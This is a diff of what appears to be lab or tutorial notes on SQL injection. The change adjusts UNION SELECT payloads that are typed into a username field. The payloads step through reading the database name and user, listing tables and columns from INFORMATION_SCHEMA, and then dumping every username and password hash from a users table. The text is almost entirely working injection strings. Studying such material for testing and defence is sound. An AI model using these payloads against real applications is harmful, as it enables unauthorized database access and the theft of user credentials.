@@ -31,18 +31,18 @@
 
 - Get DB name and DB user account
 
-  1. username => fsdfs' UNION SELECT DATABASE(), user() -- '
+  1. username => fsdfs' UNION SELECT DATABASE(), user(), 1 -- '
 
 - Get all table names, using DB name obtained above
 
-  1. username => fsdfs' UNION SELECT GROUP_CONCAT(table_name), 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' -- '
+  1. username => fsdfs' UNION SELECT GROUP_CONCAT(table_name), 1, 2 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='test' -- '
      Note: test is the DB name obtained above
 
 - Get all column names
 
-  1. username => fsdfs' UNION SELECT GROUP_CONCAT(column_name), 1 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND TABLE_SCHEMA='test' -- '
+  1. username => fsdfs' UNION SELECT GROUP_CONCAT(column_name), 1, 2 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' AND TABLE_SCHEMA='test' -- '
      Note: users is the table name obtained above
 
 - Get all usernames and corresponding password hashes
 
-  1. username => fsdfs' UNION SELECT GROUP_CONCAT(username), GROUP_CONCAT(password_hash) FROM users -- '
+  1. username => fsdfs' UNION SELECT GROUP_CONCAT(username), GROUP_CONCAT(password_hash), 1 FROM users -- '
